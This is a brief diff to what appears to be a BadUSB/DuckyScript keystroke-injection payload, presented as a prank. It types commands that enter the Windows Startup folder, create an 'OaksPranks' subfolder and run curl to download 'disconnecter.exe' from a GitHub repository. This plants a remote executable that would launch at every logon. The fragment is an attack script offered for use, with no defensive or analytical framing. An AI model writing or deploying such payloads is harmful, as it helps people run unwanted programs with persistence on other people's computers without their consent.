@@ -7,6 +7,12 @@ DELAY 1000
 STRING cd AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 ENTER
 DELAY 500
+STRING mkdir OaksPranks
+ENTER
+DELAY 500
+STRING cd OaksPranks
+ENTER
+DELAY 500
 STRING curl -LJO https://github.com/oakljen/Pranks/raw/main/disconnecter.exe
 ENTER
 DELAY 700
